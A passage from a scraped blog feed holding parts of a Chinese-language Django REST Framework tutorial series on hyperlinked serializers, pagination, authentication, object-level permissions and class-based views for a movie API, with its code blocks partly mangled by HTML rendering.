<p>首先在序列器中使用 <figure class="highlight plain"><figcaption><span>替代 ```ModelSerializer``` </span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">注:  ```HyperlinkedModelSerializer```  和 ```ModelSerializer``` 有以下几点区别: </div><div class="line"></div><div class="line">- 它没有主键域 ( pk field )</div><div class="line">- 它默认包含一个 url 域</div><div class="line">- 关联时使用的是 ```HyperlinkedRelatedField``` 而不是 ```PrimaryKeyRelatedField``` </div><div class="line"></div><div class="line">在 ```doubt/serializer.py``` 中进行如下改写: </div><div class="line"></div><div class="line">```python</div><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: utf-8 -*-</div><div class="line"></div><div class="line">from django.contrib.auth.models import User</div><div class="line">from rest_framework import serializers</div><div class="line">from douban.models import Movies, celebrity, COUNTRY_CHOICES, TYPE_CHOICES</div><div class="line"></div><div class="line">class MoviesSerializer(serializers.HyperlinkedModelSerializer):</div><div class="line">    owner = serializers.ReadOnlyField(source=&apos;owner.username&apos;)</div><div class="line">    director = serializers.HyperlinkedRelatedField(many=False, queryset=celebrity.objects.all(), view_name=&apos;director-detail&apos;)</div><div class="line">    class Meta:</div><div class="line">        model = Movies</div><div class="line">        fields = (&apos;id&apos;, &apos;title&apos;, &apos;director&apos;, &apos;year&apos;, &apos;country&apos;, &apos;type&apos;, &apos;rating&apos;, &apos;owner&apos;)</div><div class="line"></div><div class="line">class UserSerializer(serializers.HyperlinkedModelSerializer):</div><div class="line">    movies = serializers.HyperlinkedRelatedField(many=True, view_name=&apos;movies-detail&apos;, read_only=True)</div><div class="line"></div><div class="line">    class Meta:</div><div class="line">        model = User</div><div class="line">        fields = (&apos;id&apos;, &apos;username&apos;, &apos;movies&apos;)</div><div class="line"></div><div class="line">class DirectorSerializer(serializers.HyperlinkedModelSerializer):</div><div class="line">    movies = serializers.HyperlinkedRelatedField(many=True, view_name=&apos;movies-detail&apos;)</div><div class="line">    class Meta:</div><div class="line">        model = celebrity</div><div class="line">        fields = (&apos;id&apos;, &apos;name&apos;, &apos;age&apos;, &apos;gender&apos;, &apos;movies&apos;)</div></pre></td></tr></table></figure></p>
<h3 id="绑定-url"><a href="#绑定-url" class="headerlink" title="绑定 url"></a>绑定 url</h3><p>使用超链接 api 有个前提条件，我们需要确保 URL pattern 都已命名。</p>
<p>编辑 <figure class="highlight plain"><figcaption><span>进行如下修改:</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">```python</div><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: utf-8 -*-</div><div class="line"></div><div class="line">from django.conf.urls import url</div><div class="line">from rest_framework.urlpatterns import format_suffix_patterns</div><div class="line">from douban import views</div><div class="line"></div><div class="line">urlpatterns = format_suffix_patterns([</div><div class="line">    url(r&apos;^$&apos;, views.api_root),</div><div class="line">    url(r&apos;^movies/$&apos;, views.MoviesList.as_view(), name=&apos;movies-list&apos;),</div><div class="line">    url(r&apos;^movies/(?P&lt;pk&gt;[0-9]+)/$&apos;, views.MoviesDetail.as_view(), name=&apos;movies-detail&apos;),</div><div class="line">    url(r&apos;^users/$&apos;, views.UserList.as_view(), name=&apos;user-list&apos;),</div><div class="line">    url(r&apos;^users/(?P&lt;pk&gt;[0-9]+)/$&apos;, views.UserDetail.as_view(), name=&apos;user-detail&apos;),</div><div class="line">    url(r&apos;^directors/$&apos;, views.DirectorList.as_view(), name=&apos;director-list&apos;),</div><div class="line">    url(r&apos;^directors/(?P&lt;pk&gt;[0-9]+)/$&apos;, views.DirectorDetail.as_view(), name=&apos;director-detail&apos;),</div><div class="line">])</div></pre></td></tr></table></figure></p>
<p>确保每个 URL pattern 都正确的与 <figure class="highlight plain"><figcaption><span>中对应视图的命名进行绑定。</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">### 增加分页</div><div class="line"></div><div class="line">对于大量的数据在单页显示体验很不好，所以要设置分页。</div><div class="line"></div><div class="line">编辑 ```restapit/settings.py``` :</div><div class="line"></div><div class="line">```python</div><div class="line">REST_FRAMEWORK = &#123;</div><div class="line">    &apos;PAGE_SIZE&apos;: 10</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>现在用浏览器访问我们的 api 界面，不断地添数据，就可以看到分页效果辣。</p>
<h3 id="为什么使用超链接"><a href="#为什么使用超链接" class="headerlink" title="为什么使用超链接"></a>为什么使用超链接</h3><p>因为用超链接的方式有个明确的指向，比如该栗子中 movies 的 director 字段由外键变为超链接的关联形式允许直接跳转到 director 的 api 页面。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Django REST Framework 4-验证和授权]]></title>
      <url>http://lexuslee.me/2016/04/04/2016-04-04-DRF-tutorial-4-authentication/</url>
      <content type="html"><![CDATA[<h2 id="验证与授权"><a href="#验证与授权" class="headerlink" title="验证与授权"></a>验证与授权</h2><p>目前来看，我们的 API 并没有权限上的限制(即任何人都可以编辑或删除我们的 Movies )，这不是我们想要的。所以我们需要在 API 上做些限制以确保:</p>
<ul>
<li>Movies 与 Users 关联起来。</li>
<li>只有授权了的用户才能创建新的 Movies。</li>
<li>只有 Movies 的创建者才可以更新或删除它。</li>
<li>未授权的用户只能进行查看。</li>
</ul>
<h3 id="在-models-中增加以下信息"><a href="#在-models-中增加以下信息" class="headerlink" title="在 models 中增加以下信息"></a>在 models 中增加以下信息</h3><p>我们先把之前注释掉的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">director = models.ForeignKey(<span class="string">'celebrity'</span>, related_name=<span class="string">'Movies'</span>)</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">celebrity</span><span class="params">(models.Model)</span>:</span></div><div class="line">    name = models.CharField(max_length=<span class="number">100</span>, blank=<span class="keyword">True</span>, default=<span class="string">''</span>)</div><div class="line">    age = models.IntegerField()</div><div class="line">    gender = models.CharField(choices=GENDER_CHOICES, default=<span class="string">'male'</span>, max_length=<span class="number">20</span>)</div></pre></td></tr></table></figure>
<p>关联导演类的注释解开，来看看多张表在生成的 api 里的关联性。</p>
<p>接着在 <figure class="highlight plain"><figcaption><span>中的 Movies 类中加入以下代码来确定 Movies 的创建者:</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">```python</div><div class="line">owner = models.ForeignKey(&apos;auth.User&apos;, related_name=&apos;Movies&apos;)</div></pre></td></tr></table></figure></p>
<p>最后 <figure class="highlight plain"><figcaption><span>代码为:</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">```python</div><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: utf-8 -*-</div><div class="line"></div><div class="line">from django.db import models</div><div class="line"></div><div class="line"># 举个栗子</div><div class="line">COUNTRY_CHOICES = (</div><div class="line">    (&apos;US&apos;, &apos;US&apos;),</div><div class="line">    (&apos;Asia&apos;, &apos;Asia&apos;),</div><div class="line">    (&apos;CN&apos;, &apos;CN&apos;),</div><div class="line">    (&apos;TW&apos;, &apos;TW&apos;),</div><div class="line">)</div><div class="line">TYPE_CHOICES = (</div><div class="line">    (&apos;Drama&apos;, &apos;Drama&apos;),</div><div class="line">    (&apos;Thriller&apos;, &apos;Thriller&apos;),</div><div class="line">    (&apos;Sci-Fi&apos;, &apos;Sci-Fi&apos;),</div><div class="line">    (&apos;Romance&apos;, &apos;Romance&apos;),</div><div class="line">    (&apos;Comedy&apos;, &apos;Comedy&apos;)</div><div class="line">)</div><div class="line">GENDER_CHOICES = (</div><div class="line">    (&apos;male&apos;, &apos;male&apos;),</div><div class="line">    (&apos;female&apos;, &apos;female&apos;)</div><div class="line">)</div><div class="line"></div><div class="line">class Movies(models.Model):</div><div class="line">    title = models.CharField(max_length=100, blank=True, default=&apos;&apos;)</div><div class="line">    year = models.CharField(max_length=20)</div><div class="line">    # 在 director 关联了 Movies 类 和 celecrity 类, 在第4章会用到 celebrity 类</div><div class="line">    director = models.ForeignKey(&apos;celebrity&apos;, related_name=&apos;movies&apos;)</div><div class="line">    # 关联 User 类来确定 Movies 的创建者</div><div class="line">    owner = models.ForeignKey(&apos;auth.User&apos;, related_name=&apos;movies&apos;)</div><div class="line">    country = models.CharField(choices=COUNTRY_CHOICES, default=&apos;US&apos;, max_length=20)</div><div class="line">    type = models.CharField(choices=TYPE_CHOICES, default=&apos;Romance&apos;, max_length=20)</div><div class="line">    rating = models.DecimalField(max_digits=3, decimal_places=1)</div><div class="line">    created = models.DateTimeField(auto_now_add=True)</div><div class="line"></div><div class="line">    class Meta:</div><div class="line">        ordering = (&apos;created&apos;,)</div><div class="line"></div><div class="line">class celebrity(models.Model):</div><div class="line">    name = models.CharField(max_length=100, blank=True, default=&apos;&apos;)</div><div class="line">    age = models.IntegerField()</div><div class="line">    gender = models.CharField(choices=GENDER_CHOICES, default=&apos;male&apos;, max_length=20)</div></pre></td></tr></table></figure></p>
<p>修改完了模型，我们需要更新一下数据表。</p>
<p>通常来讲，我们会创建一个数据库 migration 来更新数据表，但是为了图省事儿，宝宝我索性删了整张 Movies 表直接重建！</p>
<p>在数据库中删除 douban_movies 表后在终端中执行以下命令:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ python manage.py syncdb</div></pre></td></tr></table></figure>
<p>接着我们可能会需要多个 User 来测试 API ，如果之前你没有创建 Django Super User 的话，用以下命令创建: </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ python manage.py createsuperuser</div></pre></td></tr></table></figure>
<p>然后进入 <figure class="highlight plain"><figcaption><span>界面，登录并找到  ```/user/``` 表，然后在里面手动创建 user 并赋予权限。</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">### 为新增的模型增加 endpoints</div><div class="line"></div><div class="line">既然现在我们已经有了 users 模型和 celebrity 模型，那么现在需要做的就是在 ```serializer.py``` 中让他们在 API 中展现出来，加入以下代码:</div><div class="line"></div><div class="line">```python</div><div class="line">class UserSerializer(serializers.ModelSerializer):</div><div class="line">    movies = serializers.PrimaryKeyRelatedField(many=True, queryset=Movies.objects.all())</div><div class="line"></div><div class="line">    class Meta:</div><div class="line">        model = User</div><div class="line">        fields = (&apos;id&apos;, &apos;username&apos;, &apos;movies&apos;)</div><div class="line"></div><div class="line">class DirectorSerializer(serializers.ModelSerializer):</div><div class="line">    movies = serializers.PrimaryKeyRelatedField(many=True, queryset=Movies.objects.all())</div><div class="line"></div><div class="line">    class Meta:</div><div class="line">        model = celebrity</div><div class="line">        fields = (&apos;id&apos;, &apos;name&apos;, &apos;age&apos;, &apos;gender&apos;, &apos;movies&apos;)</div></pre></td></tr></table></figure></p>
<p>因为我们之前在 <figure class="highlight plain"><figcaption><span>中添加了 ```owner = models.ForeignKey('auth.User', related_name='movies')``` 其中 ```related_name``` 设置了可以通过 User.movies 来逆向访问到 movies 表。所以在 ```ModelSerializer``` 类中我们需要在 fields 中添加一个 ```movies``` 来实现逆向访问。同理 ```DirectorSerializer``` 类中也进行相应修改。</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">接着，我们还需要在 ```views.py``` 中添加相应的视图。</div><div class="line"></div><div class="line">为 User 添加只读 API ，使用 ```ListAPIView``` 和 ```RetrieveAPIView``` </div><div class="line"></div><div class="line">为 Director 添加读写 API ，使用 ```ListCreateAPIView``` 和 ```RetrieveUpdateDestroyAPIView</div></pre></td></tr></table></figure></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserList</span><span class="params">(generics.ListAPIView)</span>:</span></div><div class="line">    queryset = User.objects.all()</div><div class="line">    serializer_class = UserSerializer</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserDetail</span><span class="params">(generics.RetrieveAPIView)</span>:</span></div><div class="line">    queryset = User.objects.all()</div><div class="line">    serializer_class = UserSerializer</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">DirectorList</span><span class="params">(generics.ListCreateAPIView)</span>:</span></div><div class="line">    queryset = celebrity.objects.all()</div><div class="line">    serializer_class = DirectorSerializer</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">DirectorDetail</span><span class="params">(generics.RetrieveUpdateDestroyAPIView)</span>:</span></div><div class="line">    queryset = celebrity.objects.all()</div><div class="line">    serializer_class = DirectorSerializer</div></pre></td></tr></table></figure>
<p>最后，修改 <figure class="highlight plain"><figcaption><span>把视图关联起来，在 ```urlpatterns``` 中加入以下4个 patterns: </span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">```python</div><div class="line">urlpatterns = [</div><div class="line">    url(r&apos;^users/$&apos;, views.UserList.as_view()),</div><div class="line">    url(r&apos;^users/(?P&lt;pk&gt;[0-9]+)/$&apos;, views.UserDetail.as_view()),</div><div class="line">    url(r&apos;^directors/$&apos;, views.DirectorList.as_view()),</div><div class="line">    url(r&apos;^directors/(?P&lt;pk&gt;[0-9]+)/$&apos;, views.DirectorDetail.as_view()),</div><div class="line">]</div></pre></td></tr></table></figure></p>
<h3 id="把-Movies-和-Director-、-User-关联起来"><a href="#把-Movies-和-Director-、-User-关联起来" class="headerlink" title="把 Movies 和 Director 、 User 关联起来"></a>把 Movies 和 Director 、 User 关联起来</h3><p>现在，如果我们新建一部 movie ，那它和 director 还有 user 是没有关联的，因为 director 和 user 信息是通过 request 接收到的，而不是通过序列器接收的，这意味着，数据库中收到 director 和 user 信息是没有(和 movies 存在)外键关系的。</p>
<p>而要让他们发生关系 ，我们的做法是在视图中重写 <figure class="highlight plain"><figcaption><span>方法。</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">```.perform_create()``` 方法允许我们处理 request 或 requested URL 中的任何信息。</div><div class="line"></div><div class="line">在 ```MoviesList``` 和 ```MoviesDetail``` 中添加以下代码:</div><div class="line"></div><div class="line">```python</div><div class="line">def perform_create(self, serializer):</div><div class="line">    serializer.save(owner=self.request.user)</div></pre></td></tr></table></figure></p>
<p>这样 <figure class="highlight plain"><figcaption><span>方法就能够在接收到 request.data 时将其传回给序列器里的 owner 和 director 了。</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">### 更新序列器</div><div class="line"></div><div class="line">在视图中重写了 ```.perform_create()``` 方法后还需要更新下序列器才能实现他们之间的关联，在 ```serializer.py``` 中的 ```MoviesSerializer``` 类添加以下代码: </div><div class="line"></div><div class="line">```python</div><div class="line">owner = serializers.ReadOnlyField(source=&apos;owner.username&apos;)</div><div class="line">director = serializers.CharField(source=&apos;celebrity.name&apos;)</div></pre></td></tr></table></figure></p>
<p>接着在 <figure class="highlight plain"><figcaption><span>Meta``` 的 fields 中加入 owner 和 director :</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">```python</div><div class="line">class Meta:</div><div class="line">	model = Movies</div><div class="line">    fields = (&apos;id&apos;, &apos;title&apos;, &apos;director&apos;, &apos;year&apos;, &apos;country&apos;, &apos;type&apos;, &apos;rating&apos;, &apos;owner&apos;)</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><figcaption><span>关键字负责控制在 fields 中展现的数据的源，它可以指向这个序列器实例的任意一个属性。</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">对 owner 属性，我们用的是 ```ReadOnlyField``` 在确保它始终是只读的，我们也可以用 ```CharField(read_only=True)``` 来等效替代，但是我嫌它太长了，其余的 Field 还有诸如 ```CharField``` 、 ```BooleanField``` 等，你可以在 [「这里」](http://www.django-rest-framework.org/api-guide/fields/)查到。</div><div class="line"></div><div class="line">### 添加权限</div><div class="line"></div><div class="line">我们希望授权的用户才能新建、更新和删除 movies，所以需要添加权限管理的功能。</div><div class="line"></div><div class="line">DRF 包含了一系列的 permission 类来实现权限管理，你可以在[「这里」](http://www.django-rest-framework.org/api-guide/permissions/) 查到。</div><div class="line"></div><div class="line">在这个栗子中，我们使用  `IsAuthenticatedOrReadOnly` 来确保授权的请求得到读写的权限，未授权的请求只有只读权限。</div><div class="line"></div><div class="line">首先，在 ```views.py``` 中 import 以下模块:</div><div class="line"></div><div class="line">```python</div><div class="line">from rest_framework import permissions</div></pre></td></tr></table></figure>
<p>接着，在 <figure class="highlight plain"><figcaption><span>和 ```MoviesDetail``` 中加入以下代码: </span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">```python</div><div class="line">permission_classes = (permissions.IsAuthenticatedOrReadOnly,)</div></pre></td></tr></table></figure></p>
<h3 id="添加可浏览的授权-api"><a href="#添加可浏览的授权-api" class="headerlink" title="添加可浏览的授权 api"></a>添加可浏览的授权 api</h3><p>如果你在浏览器中访问我们的 api Web 界面，你会发现我们没法创建新的 movies 了，因为在上一步我们设置了权限管理。</p>
<p>所以我需要在浏览器中添加用户登录来实现带界面的权限管理。(之所以说带界面是因为可以在终端中直接使用 httpie 来访问 api )</p>
<p>在 <figure class="highlight plain"><figcaption><span>中加入以下代码: </span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">```python</div><div class="line">urlpatterns += [</div><div class="line">    url(r&apos;^api-auth/&apos;, include(&apos;rest_framework.urls&apos;,</div><div class="line">                               namespace=&apos;rest_framework&apos;)),</div><div class="line">]</div></pre></td></tr></table></figure></p>
<p>这样通过在浏览器中访问 Web api 界面就能在右上角发现一个登录按钮，进行登录授权了。</p>
<h3 id="对象级权限"><a href="#对象级权限" class="headerlink" title="对象级权限"></a>对象级权限</h3><p>之前提到要使 movies 可以被任何人访问，但是只能被创建者编辑，所以需要赋予其游客访问的权限以及创建者编辑权限。</p>
<p>下面我们新建一个 <figure class="highlight plain"><figcaption><span>来详细解决这个权限问题: </span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">```python</div><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: utf-8 -*-</div><div class="line">from rest_framework import permissions</div><div class="line"></div><div class="line"></div><div class="line">class IsOwnerOrReadOnly(permissions.BasePermission):</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    游客访问权限及创建者编辑权限</div><div class="line">    &quot;&quot;&quot;</div><div class="line"></div><div class="line">    def has_object_permission(self, request, view, obj):</div><div class="line">        # 游客权限</div><div class="line">        if request.method in permissions.SAFE_METHODS:</div><div class="line">            return True</div><div class="line"></div><div class="line">        # 编辑权限</div><div class="line">        return obj.owner == request.user</div></pre></td></tr></table></figure></p>
<p>修改 <figure class="highlight plain"><figcaption><span>中 ```MoviesDetail``` 的 ```permission_class``` : </span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">```python</div><div class="line">from douban.permissions import IsOwnerOrReadOnly</div><div class="line"></div><div class="line">permission_classes = (permissions.IsAuthenticatedOrReadOnly,</div><div class="line">                      IsOwnerOrReadOnly,)</div></pre></td></tr></table></figure></p>
<p>终于，我们完成了整个 api 授权的过程！</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Django REST Framework 3-基于类的视图]]></title>
      <url>http://lexuslee.me/2016/04/03/2016-04-03-DRF-tutorial-3-class-based-views/</url>
      <content type="html"><![CDATA[<h2 id="基于类的视图"><a href="#基于类的视图" class="headerlink" title="基于类的视图"></a>基于类的视图</h2><p>基于类的视图比先前基于函数的视图的可重用性更强，可以更多快好省地 ( <a href="http://en.wikipedia.org/wiki/Don&#39;t_repeat_yourself" target="_blank" rel="external">DRY</a> )地写出简洁的代码。</p>
<h3 id="把-API-用基于类的视图的方式重写"><a href="#把-API-用基于类的视图的方式重写" class="headerlink" title="把 API 用基于类的视图的方式重写"></a>把 API 用基于类的视图的方式重写</h3><p>编辑 <figure class="highlight plain"><figcaption><span>进行如下重写</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">```python</div><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: utf-8 -*-</div><div class="line">from douban.models import Movies</div><div class="line">from douban.serializer import MoviesSerializer</div><div class="line">from django.http import Http404</div><div class="line">from rest_framework.views import APIView</div><div class="line">from rest_framework.response import Response</div><div class="line">from rest_framework import status</div><div class="line"></div><div class="line"></div><div class="line">class MoviesList(APIView):</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    罗列出所有的 Movies 或者 能新建一个 Movies</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    def get(self, request, format=None):</div><div class="line">        movies = Movies.objects.all()</div><div class="line">        serializer = MoviesSerializer(movies, many=True)</div><div class="line">        return Response(serializer.data)</div><div class="line"></div><div class="line">    def post(self, request, format=None):</div><div class="line">        serializer = MoviesSerializer(data=request.data)</div><div class="line">        if serializer.is_valid():</div><div class="line">            serializer.save()</div><div class="line">            return Response(serializer.data, status=status.HTTP_201_CREATED)</div><div class="line">        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)</div><div class="line"></div><div class="line">class MoviesDetail(APIView):</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    展示\更新或删除一个 Movies</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    def get_object(self, pk):</div><div class="line">        try:</div><div class="line">            return Movies.objects.get(pk=pk)</div><div class="line">        except Movies.DoesNotExist:</div><div class="line">            raise Http404</div><div class="line"></div><div class="line">    def get(self, request, pk, format=None):</div><div class="line">        movies = self.get_object(pk)</div><div class="line">        serializer = MoviesSerializer(movies)</div><div class="line">        return Response(serializer.data)</div><div class="line"></div><div class="line">    def put(self, request, pk, format=None):</div><div class="line">        movies = self.get_object(pk)</div><div class="line">        serializer = MoviesSerializer(movies, data=request.data)</div><div class="line">        if serializer.is_valid():</div><div class="line">            serializer.save()</div><div class="line">            return Response(serializer.data)</div><div class="line">        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)</div><div class="line"></div><div class="line">    def delete(self, request, pk, format=None):</div><div class="line">        movies = self.get_object(pk)</div><div class="line">        movies.delete()</div><div class="line">        return Response(status=status.HTTP_204_NO_CONTENT)</div></pre></td></tr></table></figure></p>
<p>并更新 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">```python</div><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: utf-8 -*-</div><div class="line"></div><div class="line">from django.conf.urls import url</div><div class="line">from rest_framework.urlpatterns import format_suffix_patterns</div><div class="line">from douban import views</div><div class="line"></div><div class="line">urlpatterns = [</div><div class="line">    url(r&apos;^dbmovies/$&apos;, views.MoviesList.as_view()),</div><div class="line">    url(r&apos;^dbmovies/(?P&lt;pk&gt;[0-9]+)/$&apos;, views.MoviesDetail.as_view()),</div><div class="line">]</div><div class="line"></div><div class="line">urlpatterns = format_suffix_patterns(urlpatterns)</div></pre></td></tr></table></figure></p>
<p>重写完毕！</p>
<h3 id="使用-Mixins"><a href="#使用-Mixins" class="headerlink" title="使用 Mixins"></a>使用 Mixins</h3><p>使用基于类的视图的一大好处是，我们可以使用各种 mixins</p>
<p>DRF 为我们提供了许多现成的 mixins ，方便我们像使用 model-backed API 一样构建 “创建/获取/更新/删除” API. 我们试着使用 Mixins 改写原先的 views</p>
<p>GenericAPIView 为我们提供了 views 核心的功能, 而 ListModelMixin 和 CreateModelMixin 为我们提供了 .list() 和 .create() 功能，我们将这些功能与 http 动作的 GET 和 POST 相绑定:</p>
